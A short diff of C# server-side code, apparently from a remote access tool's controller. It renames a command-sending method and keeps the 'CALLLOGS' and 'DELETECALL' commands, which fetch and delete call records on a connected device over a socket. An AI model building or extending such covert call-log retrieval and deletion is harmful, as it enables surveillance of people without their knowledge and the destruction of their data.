@@ -62,7 +62,7 @@ namespace Server.Views
         {
             try
             {
-                MainWindow.KomutGonder("CALLLOGS", "[VERI][0x09]", sock);
+                MainWindow.GoToOurSocket("CALLLOGS", "[VERI][0x09]", sock);
             }
             catch (Exception) { }
         }
@@ -73,7 +73,7 @@ namespace Server.Views
             {
                 try
                 {
-                    MainWindow.KomutGonder("DELETECALL", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", sock);
+                    MainWindow.GoToOurSocket("DELETECALL", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", sock);
                     Text = "Çağrı Kayıtları";
                     listView1.SelectedItems[0].Remove();
                 }
